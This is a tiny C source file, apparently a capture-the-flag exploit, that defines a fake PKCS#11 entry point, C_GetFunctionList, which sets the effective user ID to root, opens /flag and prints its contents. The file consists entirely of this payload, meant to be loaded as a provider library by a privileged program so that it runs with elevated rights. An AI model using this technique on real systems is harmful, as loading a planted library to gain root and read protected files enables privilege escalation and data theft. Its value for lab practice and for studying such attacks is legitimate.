#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void C_GetFunctionList(){
        seteuid(0);
        FILE* fptr;
        fptr = fopen("/flag","r");
        char myString[100];
        fgets(myString,100,fptr);
        printf("%s",myString);
}